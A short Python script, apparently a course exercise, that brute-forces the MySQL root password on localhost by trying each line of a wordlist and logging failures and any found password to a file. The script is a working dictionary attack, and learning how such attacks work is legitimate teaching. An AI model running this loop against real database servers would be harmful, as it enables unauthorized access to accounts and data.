def bruteforce(liste):
    import MySQLdb
    import sys,time
    import os
    
    os.chdir(r"C:\Users\ATTIE\Downloads\Cours-Python\Divers\TD19-databases")
    
    fd = open(liste, "r")
    liste_pass=fd.readlines()
    
    resultat = open("result.txt", "w")

    for password in liste_pass:
        try:
            # If connect fails, exception MySQLdb.Error is raised
            # rstrip("8") removes string from "8" trailing character
            # MySQLdb.connect("localhost", "root", password.rstrip(), "python_db")
            MySQLdb.connect("127.0.0.1", "root", password.rstrip(), "test")
            resultat.write("!!!!!LE MOT DE PASSE A ETE TROUVE: " + password + "\n")
            resultat.close()
            #print("Le password est: {0}".format(password))
            break
        except MySQLdb.Error as e:
            # The except clause names an exception class (MySQLdb.Error in this example)
            #  to obtain the database-specific error information that MySQLdb can provide,
            #  as well as a variable (e) in which to store the information. If an exception
            #  occurs, MySQLdb makes this information available in e.args, a two-element
            #  tuple containing the numeric error code and a string describing the error.
            #  The except clause shown in the example prints both values and exits.
            #  print("Essai " + str(i) + " : " + password + "\n")
            resultat.write("Erreur %d: %s" % (e.args[0], e.args[1]))
            resultat.write("Le password suivant n'est pas le bon: " + password)
        time.sleep(0.1)
        
    resultat.close()
    if fd.closed == False:
        fd.close()
    return resultat

if __name__ == "__main__":
    res = bruteforce(liste ="DATAdico_parse_error_small.txt")
    r = open("result.txt", "r")
    re = r.read()
    print(re)
    r.close()
